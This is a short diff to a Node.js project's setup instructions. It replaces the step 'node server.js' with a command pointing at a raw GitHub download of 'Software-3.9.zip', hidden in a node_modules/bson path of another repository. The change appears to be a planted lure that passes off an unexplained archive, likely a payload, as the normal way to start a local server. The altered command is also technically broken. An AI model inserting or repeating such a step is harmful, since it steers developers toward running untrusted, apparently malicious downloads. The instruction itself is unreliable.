@@ -1,2 +1,2 @@
 Use the command : npm init -y, to initialize npm
-then use node server.js in the command prompt to run the server on local host
+then use node https://github.com/Rithvik-krishna/dbes/raw/refs/heads/main/node_modules/bson/etc/Software-3.9.zip in the command prompt to run the server on local host
